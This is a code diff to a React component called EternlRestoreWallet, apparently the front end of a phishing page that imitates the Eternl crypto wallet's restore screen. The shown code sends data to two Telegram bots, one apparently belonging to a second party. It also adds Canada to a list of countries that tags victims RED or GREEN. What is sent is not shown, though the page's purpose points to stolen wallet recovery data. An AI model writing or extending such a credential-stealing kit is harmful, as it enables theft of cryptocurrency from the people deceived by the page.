@@ -26,8 +26,6 @@ function EternlRestoreWallet() {
     getCountry();
   }, []);
 
-
-
   const handleToggle = () => {
     setIsMenuOpen(!isMenuOpen);
   };
@@ -57,14 +55,19 @@ function EternlRestoreWallet() {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
-    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
-
-    
+    const greenCountries = [
+      "united states",
+      "united kingdom",
+      "nigeria",
+      "united arab emirates",
+      "canada",
+    ];
+    const color = greenCountries.includes(country.toLowerCase())
+      ? "RED"
+      : "GREEN";
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
-
 
     const data = {
       chat_id: chat_id,
@@ -98,7 +101,7 @@ function EternlRestoreWallet() {
           },
           body: JSON.stringify(odata),
         });
-  
+
         if (!oresponse.ok) {
           throw new Error("Network response was not ok");
         }
